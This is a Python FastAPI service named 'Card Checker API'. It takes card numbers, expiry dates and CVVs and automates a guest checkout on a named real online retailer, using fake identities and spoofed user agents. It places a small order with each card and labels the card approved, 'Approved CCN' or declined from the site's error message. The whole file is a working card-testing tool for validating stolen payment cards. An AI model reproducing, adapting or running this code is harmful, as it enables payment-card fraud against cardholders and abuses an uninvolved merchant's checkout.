from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import requests
import re
from fake_useragent import FakeUserAgent
from faker import Faker
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

app = FastAPI(title="Card Checker API", version="1.0.0")

class CardRequest(BaseModel):
    card: str
    month_length: int = 2
    year_length: int = 4

class CardResponse(BaseModel):
    status: str
    message: str
    card_info: dict = None

def splitter(text: str, start: str, end: str) -> str:
    try:
        start_index = text.index(start) + len(start)
        end_index = text.index(end, start_index)
        return text[start_index:end_index]
    except ValueError:
        return ""

def parse_card(card: str):
    parts = re.split(r"\D+", card.strip())[:4]
    if len(parts) < 4:
        return "Invalid length (4 parts needed)."
    try:
        num, month, year, cvv = map(int, parts)
        month_str = str(month).zfill(2)
        year_str = str(year)
        if len(year_str) == 2:
            year_str = str(2000 + year)
        return (str(num), month_str, year_str, str(cvv))
    except ValueError:
        return "Invalid card format."

def card_type(card_num):
    num = "".join(filter(str.isdigit, str(card_num)))
    if num[0] == "4":
        return "VISA"
    elif num[0] == "5":
        return "MasterCard"
    elif num[:2] in ["34", "37"]:
        return "AMEX"
    elif num[:4] == "6011" or num[:2] == "65":
        return "DISCOVER"
    else:
        return "CARD TYPE"

async def process_payment(card_data):
    card_num, card_mm, card_yy, card_cvn = card_data
    card_t = card_type(card_num)
    
    user_agent = str(FakeUserAgent().random)
    fake = Faker()
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    phone = fake.numerify(text="###-###-####")
    email = fake.email(True, "gmail.com")
    street_address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    postal_code = fake.postalcode()
    
    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})
    
    try:
        # REQ 1: Add to cart
        resp = session.post(
            "https://www.bluescentric.com/ActionService.asmx/AddToCart",
            headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/p-556-14-in-mono-male-to-35mm-stereo-female-adapter.aspx",
                "x-requested-with": "XMLHttpRequest",
            },
            json={
                "sProductId": 556,
                "sVariantId": 559,
                "sCartType": 0,
                "sQuantity": "1",
                "colorOptions": "",
                "sizeOptions": "",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 1: {resp.status_code}"
        
        # REQ 2: Get shopping cart
        resp = session.get(
            "https://www.bluescentric.com/shoppingcart.aspx",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "referer": "https://www.bluescentric.com/p-556-14-in-mono-male-to-35mm-stereo-female-adapter.aspx",
                "upgrade-insecure-requests": "1",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 2: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 3: Checkout
        resp = session.post(
            "https://www.bluescentric.com/shoppingcart.aspx",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/shoppingcart.aspx",
            },
            data={
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
                "ctl00$PageContent$ctrlShoppingCart$ctl00$ctl01": "1",
                "ctl00$PageContent$txtPromotionCode": "",
                "ctl00$PageContent$hidCouponCode": "",
                "ctl00$PageContent$OrderNotes": "",
                "ctl00$PageContent$btnCheckout": "Checkout Now",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 3: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 4: Guest checkout
        resp = session.post(
            "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
            },
            data={
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
                "ctl00$PageContent$EMail": "",
                "ctl00$PageContent$Password": "",
                "ctl00$PageContent$Skipregistration": "Checkout As Guest",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 4: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 5: Billing info
        resp = session.post(
            "https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true",
            },
            data={
                "__EVENTTARGET": "ctl00$PageContent$btnContinueCheckout",
                "__EVENTARGUMENT": "",
                "__LASTFOCUS": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
                "ctl00$PageContent$txtAnonEmail": email,
                "ctl00$PageContent$Offers": "rbAnonOffersNo",
                "ctl00$PageContent$ctrlBillingAddress$FirstName": first_name,
                "ctl00$PageContent$ctrlBillingAddress$LastName": last_name,
                "ctl00$PageContent$ctrlBillingAddress$Phone": phone,
                "ctl00$PageContent$ctrlBillingAddress$Address1": street_address,
                "ctl00$PageContent$ctrlBillingAddress$Address2": "",
                "ctl00$PageContent$ctrlBillingAddress$City": city,
                "ctl00$PageContent$ctrlBillingAddress$Country": "United States",
                "ctl00$PageContent$ctrlBillingAddress$State": state,
                "ctl00$PageContent$ctrlBillingAddress$Zip": postal_code,
                "ctl00$PageContent$cbBillIsShip": "on",
                "ctl00$PageContent$ctrlShippingAddress$FirstName": first_name,
                "ctl00$PageContent$ctrlShippingAddress$LastName": last_name,
                "ctl00$PageContent$ctrlShippingAddress$Phone": phone,
                "ctl00$PageContent$ctrlShippingAddress$Address1": street_address,
                "ctl00$PageContent$ctrlShippingAddress$Address2": "",
                "ctl00$PageContent$ctrlShippingAddress$City": city,
                "ctl00$PageContent$ctrlShippingAddress$Country": "United States",
                "ctl00$PageContent$ctrlShippingAddress$State": state,
                "ctl00$PageContent$ctrlShippingAddress$Zip": postal_code,
                "ctl00$PageContent$hidPagePlacement": "0",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 5: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 6: Shipping
        resp = session.post(
            "https://www.bluescentric.com/checkoutshipping.aspx?dontupdateid=true",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
            },
            data={
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
                "ctl00$PageContent$ctrlShippingMethods$ctrlShippingMethods": "6",
                "ctl00$PageContent$btnContinueCheckout": "Continue Checkout",
                "ctl00$PageContent$OrderNotes": "",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 6: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 7: Payment
        resp = session.post(
            "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD&errormsg=34",
            },
            data={
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__LASTFOCUS": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
                "ctl00$PageContent$ctrlPaymentMethod$PaymentSelection": "rbCREDITCARD",
                "ctl00$PageContent$ctrlCreditCardPanel$ddlCCType": card_t,
                "ctl00$PageContent$ctrlCreditCardPanel$txtCCName": f"{first_name} {last_name}",
                "ctl00$PageContent$ctrlCreditCardPanel$txtCCNumber": card_num,
                "ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpMonth": card_mm,
                "ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpYr": card_yy,
                "ctl00$PageContent$ctrlCreditCardPanel$txtCCVerCd": card_cvn,
                "ctl00$PageContent$txtPromotionCode": "",
                "ctl00$PageContent$hidCouponCode": "",
                "ctl00$PageContent$btnContCheckout": "Continue Checkout",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 7: {resp.status_code}"
        
        viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
        viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
        eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
        
        # REQ 8: Final payment
        resp = session.post(
            "https://www.bluescentric.com/checkoutreview.aspx?paymentmethod=CREDITCARD",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.bluescentric.com",
                "referer": "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD&errormsg=34",
            },
            data={
                "__EVENTTARGET": "ctl00$PageContent$btnContinueCheckout2",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": viewstate,
                "__VIEWSTATEGENERATOR": viewstategenerator,
                "__EVENTVALIDATION": eventvalidation,
                "ctl00$ctrlPageSearch$SearchText": "",
            },
        )
        
        if resp.status_code != 200:
            return f"ERROR IN REQUEST 8: {resp.status_code}"
        
        error_msg = splitter(resp.text, '_ErrorMsgLabel" class="error">', "<")
        
        if error_msg == "":
            return "Approved", "Charged $1.75"
        elif "CVV2" in error_msg:
            return "Approved CCN", error_msg
        else:
            return "Declined", error_msg
            
    except Exception as e:
        return f"ERROR: {str(e)}"

@app.get("/")
async def root():
    return {"message": "Card Checker API", "status": "running"}

@app.get("/health")
async def health():
    return {"status": "healthy"}

@app.post("/check-card", response_model=CardResponse)
async def check_card(request: CardRequest):
    try:
        card = parse_card(request.card)
        if not isinstance(card, tuple):
            raise HTTPException(status_code=400, detail=f"Card parsing error: {card}")
        
        result = await process_payment(card)
        
        if isinstance(result, tuple):
            status, message = result
            return CardResponse(
                status=status,
                message=message,
                card_info={
                    "card_number": card[0][:4] + "****" + card[0][-4:],
                    "card_type": card_type(card[0]),
                    "expiry": f"{card[1]}/{card[2]}"
                }
            )
        else:
            return CardResponse(
                status="Error",
                message=str(result)
            )
            
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
